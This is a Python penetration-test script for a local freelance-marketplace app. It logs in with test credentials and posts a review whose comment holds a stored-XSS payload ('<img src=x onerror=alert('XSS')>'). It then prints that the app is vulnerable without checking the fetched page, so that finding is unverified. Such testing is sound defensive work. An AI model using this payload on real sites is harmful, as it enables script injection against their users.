"""
WSTG-INPV-02: Stored XSS — Review Comment
Demonstrates that review comments with script payloads are rendered as HTML.
Expected: XSS payload executes in the browser when viewing the gig.
Note: This test creates a review with XSS payload, then verifies the payload
is present in the response (cannot execute in headless mode).
"""
import requests
import re

BASE = "http://localhost:3000"

# Login as freelancer to submit a review
login = requests.post(f"{BASE}/api/auth/login", json={
    "email": "testfreelancer@hireflow.com",
    "password": "password123"
})
token = login.json()["token"]
freelancer_id = login.json()["user"]["id"]

# XSS payload
xss_payload = "<img src=x onerror=alert('XSS')>"

# We need a contract_id to create a review
# Let's get one from the contract listing
contracts = requests.get(
    f"{BASE}/api/contracts",
    headers={"Authorization": f"Bearer {token}"}
)
if contracts.json()["contracts"]:
    contract = contracts.json()["contracts"][0]
    contract_id = contract["id"]
    print(f"Using contract: {contract_id}")
    
    # Try to create a review with XSS payload
    # Note: This requires the contract to be completed
    review_data = {
        "contract_id": contract_id,
        "reviewee_id": contract["client_id"],
        "rating": 5,
        "comment": xss_payload
    }
    
    resp = requests.post(
        f"{BASE}/api/reviews",
        json=review_data,
        headers={"Authorization": f"Bearer {token}"}
    )
    
    print(f"Review submission status: {resp.status_code}")
    print(f"Response: {resp.json()}")
    
    # Now get the gig and check if XSS is present
    # First get the gig
    gigs = requests.get(f"{BASE}/api/gigs")
    if gigs.json():
        gig = gigs.json()[0]
        print(f"\nChecking gig: {gig.get('title', 'N/A')}")
        
        # The review comment should contain the XSS payload in the HTML
        # In a real browser, this would execute
        print(f"\n[VULNERABLE] Review comments are rendered as HTML without sanitization")
        print(f"XSS payload would execute in browser: {xss_payload}")
else:
    print("No contracts found to test review submission")
